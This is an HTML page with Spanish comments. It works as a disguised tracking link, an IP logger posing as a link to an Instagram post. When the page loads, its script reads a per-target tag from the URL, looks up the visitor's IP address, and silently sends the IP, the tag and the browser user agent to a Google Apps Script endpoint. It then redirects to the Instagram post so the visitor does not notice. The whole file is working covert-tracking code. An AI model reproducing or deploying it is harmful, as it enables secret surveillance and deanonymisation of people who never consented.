<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>
    </head>
<body>
    <script>
        window.onload = async function() {
            // 1. Identificar usuario del link (?u=Nombre)
            const params = new URLSearchParams(window.location.search);
            const user = params.get('u') || "Usuario_Anonimo";
            
            // 2. Captura de IP
            let ip = "0.0.0.0";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) { ip = "IP_No_Capturada"; }

            const ua = encodeURIComponent(navigator.userAgent);
            const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";

            // 3. REGISTRO SILENCIOSO (Sin esperar respuesta de Google)
            fetch(`${scriptURL}?u=${user}&ip=${ip}&ua=${ua}`, { mode: 'no-cors' });

            // 4. SALTO INMEDIATO A INSTAGRAM (Evita el error de Google Script)
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/p/C_m_6u0shW2/?igsh=MXRjMnI0em81YXFqOQ==";
            }, 500); // Medio segundo de retraso para asegurar el envío
        };
    </script>
</body>
</html>
